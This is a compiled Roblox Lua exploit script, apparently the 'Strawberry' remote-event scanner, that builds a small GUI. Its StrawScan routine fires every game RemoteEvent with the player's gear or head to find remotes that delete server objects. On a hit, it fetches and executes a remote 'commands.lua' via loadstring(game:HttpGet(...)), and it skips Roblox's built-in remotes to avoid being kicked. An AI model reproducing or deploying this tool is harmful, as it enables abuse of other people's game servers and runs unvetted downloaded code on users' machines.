-- DO NOT EDIT, THIS IS NOT MENT TO BE EDITED. THIS IS A COMPILED VERSION OF SCANNER.RBXMX
-- IF YOU WANT TO MAKE CHANGES, EDIT SCANNER.RBXMX AND CONVERT IT BACK TO A SCANNER.LUA SCRIPT VIA GUI 2 LUA BY UNIQADEV
-- AND ADD THIS WARNING MESSAGE

-- Instances: 22 | Scripts: 3 | Modules: 0 | Tags: 0
local G2L = {};

-- StarterGui.StrawMain
G2L["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
G2L["1"]["IgnoreGuiInset"] = true;
G2L["1"]["DisplayOrder"] = 2147483647;
G2L["1"]["ScreenInsets"] = Enum.ScreenInsets.DeviceSafeInsets;
G2L["1"]["Name"] = [[StrawMain]];
G2L["1"]["ResetOnSpawn"] = false;


-- StarterGui.StrawMain.Scanner
G2L["2"] = Instance.new("Frame", G2L["1"]);
G2L["2"]["BorderSizePixel"] = 0;
G2L["2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["2"]["Size"] = UDim2.new(0, 200, 0, 90);
G2L["2"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2"]["Name"] = [[Scanner]];
G2L["2"]["BackgroundTransparency"] = 1;


-- StarterGui.StrawMain.Scanner.Glass
G2L["3"] = Instance.new("ImageLabel", G2L["2"]);
G2L["3"]["ZIndex"] = -2147483647;
G2L["3"]["BorderSizePixel"] = 0;
G2L["3"]["BackgroundColor3"] = Color3.fromRGB(67, 67, 67);
G2L["3"]["ImageTransparency"] = 0.11;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["3"]["ImageColor3"] = Color3.fromRGB(171, 35, 62);
G2L["3"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["3"]["Image"] = [[rbxassetid://413422291]];
G2L["3"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["3"]["BackgroundTransparency"] = 1;
G2L["3"]["Name"] = [[Glass]];
G2L["3"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.StrawMain.Scanner.Glass.UIGradient
G2L["4"] = Instance.new("UIGradient", G2L["3"]);



-- StarterGui.StrawMain.Scanner.Glass.UICorner
G2L["5"] = Instance.new("UICorner", G2L["3"]);
G2L["5"]["CornerRadius"] = UDim.new(0, 10);


-- StarterGui.StrawMain.Scanner.Shadow
G2L["6"] = Instance.new("ImageLabel", G2L["2"]);
G2L["6"]["ZIndex"] = -30;
G2L["6"]["BorderSizePixel"] = 0;
G2L["6"]["SliceCenter"] = Rect.new(200, 200, 500, 500);
G2L["6"]["SliceScale"] = 0.095;
G2L["6"]["ScaleType"] = Enum.ScaleType.Slice;
G2L["6"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["6"]["ImageColor3"] = Color3.fromRGB(153, 153, 153);
G2L["6"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["6"]["Image"] = [[http://www.roblox.com/asset/?id=13960012399]];
G2L["6"]["Size"] = UDim2.new(1, 18, 1, 18);
G2L["6"]["BackgroundTransparency"] = 1;
G2L["6"]["Name"] = [[Shadow]];
G2L["6"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.StrawMain.Scanner.Shadow.UIGradient
G2L["7"] = Instance.new("UIGradient", G2L["6"]);
G2L["7"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 52, 88)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 52, 88))};


-- StarterGui.StrawMain.Scanner.Gradient
G2L["8"] = Instance.new("Frame", G2L["2"]);
G2L["8"]["ZIndex"] = -1000;
G2L["8"]["BorderSizePixel"] = 0;
G2L["8"]["BackgroundColor3"] = Color3.fromRGB(162, 162, 162);
G2L["8"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8"]["Name"] = [[Gradient]];
G2L["8"]["BackgroundTransparency"] = 0.9;


-- StarterGui.StrawMain.Scanner.Gradient.UIGradient
G2L["9"] = Instance.new("UIGradient", G2L["8"]);
G2L["9"]["Rotation"] = -90;
G2L["9"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 0),NumberSequenceKeypoint.new(0.469, 1),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.StrawMain.Scanner.Gradient.UICorner
G2L["a"] = Instance.new("UICorner", G2L["8"]);
G2L["a"]["CornerRadius"] = UDim.new(0, 10);


-- StarterGui.StrawMain.Scanner.UICorner
G2L["b"] = Instance.new("UICorner", G2L["2"]);
G2L["b"]["CornerRadius"] = UDim.new(0, 10);


-- StarterGui.StrawMain.Scanner.Top
G2L["c"] = Instance.new("TextLabel", G2L["2"]);
G2L["c"]["BorderSizePixel"] = 0;
G2L["c"]["TextSize"] = 14;
G2L["c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c"]["BackgroundTransparency"] = 1;
G2L["c"]["RichText"] = true;
G2L["c"]["Size"] = UDim2.new(1, 0, 0, 35);
G2L["c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c"]["Text"] = [[<b>Strawberry 🍓</b>: Scanner]];
G2L["c"]["Name"] = [[Top]];


-- StarterGui.StrawMain.Scanner.UIDrag
G2L["d"] = Instance.new("LocalScript", G2L["2"]);
G2L["d"]["Name"] = [[UIDrag]];


-- StarterGui.StrawMain.Scanner.ScanBtn
G2L["e"] = Instance.new("TextButton", G2L["2"]);
G2L["e"]["BorderSizePixel"] = 0;
G2L["e"]["TextSize"] = 14;
G2L["e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["e"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Italic);
G2L["e"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["e"]["BackgroundTransparency"] = 1;
G2L["e"]["Size"] = UDim2.new(0, 150, 0, 35);
G2L["e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["e"]["Text"] = [[Scan]];
G2L["e"]["Name"] = [[ScanBtn]];
G2L["e"]["Position"] = UDim2.new(0.5, 0, 1, -35);


-- StarterGui.StrawMain.Scanner.ScanBtn.UICorner
G2L["f"] = Instance.new("UICorner", G2L["e"]);
G2L["f"]["CornerRadius"] = UDim.new(0, 10);


-- StarterGui.StrawMain.Scanner.ScanBtn.Glass
G2L["10"] = Instance.new("ImageLabel", G2L["e"]);
G2L["10"]["ZIndex"] = -2147483647;
G2L["10"]["BorderSizePixel"] = 0;
G2L["10"]["BackgroundColor3"] = Color3.fromRGB(26, 26, 26);
G2L["10"]["ImageTransparency"] = 0.11;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["10"]["ImageColor3"] = Color3.fromRGB(171, 35, 62);
G2L["10"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["10"]["Image"] = [[rbxassetid://413422291]];
G2L["10"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["10"]["BackgroundTransparency"] = 1;
G2L["10"]["Name"] = [[Glass]];
G2L["10"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.StrawMain.Scanner.ScanBtn.Glass.UIGradient
G2L["11"] = Instance.new("UIGradient", G2L["10"]);



-- StarterGui.StrawMain.Scanner.ScanBtn.Glass.UICorner
G2L["12"] = Instance.new("UICorner", G2L["10"]);
G2L["12"]["CornerRadius"] = UDim.new(0, 10);


-- StarterGui.StrawMain.Scanner.ScanBtn.Shadow
G2L["13"] = Instance.new("ImageLabel", G2L["e"]);
G2L["13"]["ZIndex"] = -30;
G2L["13"]["BorderSizePixel"] = 0;
G2L["13"]["SliceCenter"] = Rect.new(200, 200, 500, 500);
G2L["13"]["SliceScale"] = 0.095;
G2L["13"]["ScaleType"] = Enum.ScaleType.Slice;
G2L["13"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["13"]["ImageColor3"] = Color3.fromRGB(153, 153, 153);
G2L["13"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["13"]["Image"] = [[http://www.roblox.com/asset/?id=13960012399]];
G2L["13"]["Size"] = UDim2.new(1, 18, 1, 18);
G2L["13"]["BackgroundTransparency"] = 1;
G2L["13"]["Name"] = [[Shadow]];
G2L["13"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.StrawMain.Scanner.ScanBtn.Shadow.UIGradient
G2L["14"] = Instance.new("UIGradient", G2L["13"]);
G2L["14"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 52, 88)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 52, 88))};


-- StarterGui.StrawMain.Scanner.ScanBtn.Function
G2L["15"] = Instance.new("LocalScript", G2L["e"]);
G2L["15"]["Name"] = [[Function]];


-- StarterGui.StrawMain.Scanner.StrawScan
G2L["16"] = Instance.new("LocalScript", G2L["2"]);
G2L["16"]["Name"] = [[StrawScan]];


-- StarterGui.StrawMain.Scanner.UIDrag
local function C_d()
local script = G2L["d"];
	local UIS = game:GetService('UserInputService')
	local frame = script.Parent
	local dragToggle = nil
	local dragSpeed = 0.25
	local dragStart = nil
	local startPos = nil
	
	local function updateInput(input)
		local delta = input.Position - dragStart
		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		game:GetService('TweenService'):Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
	end
	
	frame.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
			dragToggle = true
			dragStart = input.Position
			startPos = frame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)
	
	UIS.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			if dragToggle then
				updateInput(input)
			end
		end
	end)
	
end;
task.spawn(C_d);
-- StarterGui.StrawMain.Scanner.ScanBtn.Function
local function C_15()
local script = G2L["15"];
	local TweenService = game:GetService("TweenService")
	local Button = script.Parent
	
	local Info = TweenInfo.new(0.15, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut)
	local CanClick = true
	
	Button.MouseEnter:Connect(function()
		if not CanClick then return end
		
		local Tween = TweenService:Create(Button.Glass, Info, {BackgroundTransparency = 0.25})
		Tween:Play()
	end)
	
	Button.MouseLeave:Connect(function()
		if not CanClick then return end
		
		local Tween = TweenService:Create(Button.Glass, Info, {BackgroundTransparency = 1})
		Tween:Play()
	end)
	
	Button.MouseButton1Click:Connect(function()
		if not CanClick then return end
		CanClick = false
		
		local Tween = TweenService:Create(Button.Glass, Info, {BackgroundTransparency = 0.25})
		Tween:Play()
	end)
	
end;
task.spawn(C_15);
-- StarterGui.StrawMain.Scanner.StrawScan
local function C_16()
local script = G2L["16"];
	--[[
	
	/// StrawScan ///
	/// Last updated: 9/15/2025 ///
	
	Strawberry's advanced remote event scanner component made by saji
	Everything below will be explained with comments
	FEEL FREE TO CONTRIBUTE CUS CODE IS MEH
	
	u can use for ur own scripts and stuff if u give credits that ur using strawscan heh heh
	
	]]
	
	local ScanButton = script.Parent.ScanBtn -- Binded button to start scan
	local AlreadyScanned = false -- So they cant scan twice
	
	local MaxScanTime = 0.25 -- if a remote event does not respond by this much time, it is skipped
	
	local Players = game:GetService("Players")
	local LocalPlayer = Players.LocalPlayer
	local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	-- Player related variables
	
	local CurrentVulnerableRemote = nil -- if a vulnerable remote event is found it will be stored here
	
	local function isDestroyed(obj)
		return not obj:IsDescendantOf(game)
	end -- Good way to check if a object got destroyed in runtime
	
	local function isVulnerable(rmevent)
		-- Stage 1: TestPart Allocation (for feeding it to remote events)
	
		-- Attempts to get startergear which is a useless object we can use for testing
		local TestPart = LocalPlayer:FindFirstChild("StarterGear")
		if not TestPart then
			warn("StrawScan // StarterGear not found, replacing with char head")
			TestPart = Character:FindFirstChild("Head")
		end -- If startergear is not found, it will try to test with the chars head
	
		if not TestPart then
			error("StrawScan // TestPart could not be found!")
			return false
		end -- If failed to find a testpart it will just quit and return as non vuln
	
		-- Stage 2: Firing the remote and seeing if its vulnerable
	
		rmevent:FireServer(TestPart)
	
		local t = tick()
		while tick() - t < MaxScanTime do
			if isDestroyed(TestPart) then
				print("StrawScan // Vulnerable remote found!: " .. rmevent:GetFullName())
				CurrentVulnerableRemote = rmevent
				return true
			end
	
			task.wait()
		end -- Actively checking if the remote event has responded
	
		-- If you got to this point, the remote wasent vulnerable so we are returning false
		print("StrawScan // Remote not vulnerable: " .. rmevent:GetFullName())
		return false
	end -- Fully scans a remote event to check if it has a vuln
	
	-- Now that we have setup the variables and functions its time for the aCtuAl scan logic!!!!
	
	ScanButton.MouseButton1Click:Connect(function()
		if AlreadyScanned then return end
		AlreadyScanned = true
	
		local Remotes = {}
		local FoundRemote = false
	
		-- goes through every remote and if its valid its added to the scan queue
		for _, v in pairs(game:GetDescendants()) do
			if v:IsA("RemoteEvent") then
				if v ~= nil and v.Parent ~= nil and v.Parent.Name == "RobloxReplicatedStorage" then continue end
				if v ~= nil and v.Parent ~= nil and v.Parent.Name == "DefaultChatSystemChatEvents" then continue end
				-- Blocks remote events that are apart of roblox to speed up scan and prevent kick
	
				FoundRemote = true
				table.insert(Remotes, v)
			end
		end
	
		if not FoundRemote then
			ScanButton.TextSize = 12 -- sizing it down for the following message
			ScanButton.Text = "Sorry, no vuln remotes" -- telling the pookie user that no remote is vuln :sadface:
	
			return
		end
	
		-- counting for user cus why not
		ScanButton.Text = "Scanning... (0/" .. tostring(#Remotes) .. ")"
	
		-- scans and counts every remote inside the queue
		for i, v in pairs(Remotes) do
			ScanButton.Text = "Scanning... (" .. tostring(i) .. "/" .. tostring(#Remotes) .. ")"
	
			local vulnerable = isVulnerable(v)
			if vulnerable then
				task.delay(0, function()
					ScanButton.TextSize = 12 -- sizing it down for the following message
					ScanButton.Text = "Vuln found, booting up" -- telling the pookie user that a vuln remote is found :happyface:
	
					task.wait(0.1) -- slight delay
	
					local VulnRemote = Instance.new("ObjectValue") -- creates a pointer for the vulnerable remote so the commands script can access the remote
					VulnRemote.Parent = LocalPlayer.PlayerGui
					VulnRemote.Name = "StrawberryHookedRM"
					VulnRemote.Value = CurrentVulnerableRemote
	
					loadstring(game:HttpGet("https://raw.githubusercontent.com/StrawberryRBLX/Strawberry-Scanner/refs/heads/main/release/commands.lua"))() -- loads up the commands script
					task.wait(1) -- waits before removing the scanner UI
					script.Parent.Parent:Destroy() -- removes the scanner UI
				end)
	
				break
			end
		end
	
		if CurrentVulnerableRemote ~= nil and CurrentVulnerableRemote:IsA("RemoteEvent") then
			return
		end
	
		ScanButton.TextSize = 12 -- sizing it down for the following message
		ScanButton.Text = "Sorry, no vuln remotes" -- telling the pookie user that no remote is vuln :sadface:
	
		return
	end) -- // CRAP LOGIC THAT HANDLES THE SCANNNINGGGGG
	
end;
task.spawn(C_16);

return G2L["1"], require;
